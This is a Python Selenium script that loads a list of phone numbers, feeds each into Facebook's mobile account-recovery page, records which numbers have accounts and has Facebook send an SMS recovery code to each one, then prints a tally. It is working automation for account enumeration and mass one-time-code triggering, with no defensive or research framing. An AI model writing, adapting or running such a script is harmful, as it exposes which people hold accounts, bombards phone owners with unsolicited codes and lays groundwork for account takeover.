from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Initialize counters
total_numbers = 0
checked_numbers = 0
remaining = 0
successful_sent = 0
not_registered = 0

# Read numbers from file
def load_numbers(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Main automation function
def check_numbers(numbers):
    global checked_numbers, remaining, successful_sent, not_registered
    driver = webdriver.Chrome()  # Or webdriver.Firefox() if using Firefox
    driver.implicitly_wait(10)
    facebook_url = "https://m.facebook.com/login/identify/"

    for number in numbers:
        checked_numbers += 1
        remaining = total_numbers - checked_numbers
        print(f"\nChecking number: {number}")
        try:
            driver.get(facebook_url)
            time.sleep(2)

            # Enter the number in the input field
            input_field = driver.find_element(By.NAME, "email")
            input_field.clear()
            input_field.send_keys(number)
            input_field.send_keys(Keys.RETURN)
            time.sleep(3)

            # Check if "Try another way" button exists
            try:
                try_another_btn = driver.find_element(By.LINK_TEXT, "Try another way")
                try_another_btn.click()
                time.sleep(3)
            except:
                # If not found, maybe no account associated
                print(f"{number} - No account associated.")
                not_registered += 1
                continue

            # Now on the page to get code via SMS
            # Wait for options to load
            options = driver.find_elements(By.XPATH, "//input[@name='verification_method' or @type='radio']")
            sms_option_found = False
            for option in options:
                val = option.get_attribute("value")
                label = option.find_element(By.XPATH, "..").text
                if "SMS" in label or "Text message" in label:
                    option.click()
                    sms_option_found = True
                    break

            if not sms_option_found:
                print(f"{number} - SMS option not available.")
                continue

            # Click "Continue" or "Next" button
            continue_btn = driver.find_element(By.NAME, "submit")
            continue_btn.click()
            time.sleep(3)

            # Here, Facebook would send OTP if number is valid
            # To simulate, ask user to confirm if OTP was sent
            print(f"Sent OTP to {number} (if applicable).")
            successful_sent += 1

            print(f"Number: {number} - Sent OTP successfully.")

        except Exception as e:
            print(f"Error processing {number}: {e}")
            continue

    driver.quit()

if __name__ == "__main__":
    numbers = load_numbers("Numbers.txt")
    total_numbers = len(numbers)
    print(f"Total numbers loaded: {total_numbers}")
    print("Starting Facebook account check...")
    check_numbers(numbers)

    print("\n=== Check Summary ===")
    print(f"Total Numbers: {total_numbers}")
    print(f"Checked: {checked_numbers}")
    print(f"Remaining: {total_numbers - checked_numbers}")
    print(f"Successfully sent OTP: {successful_sent}")
    print(f"No account associated: {not_registered}")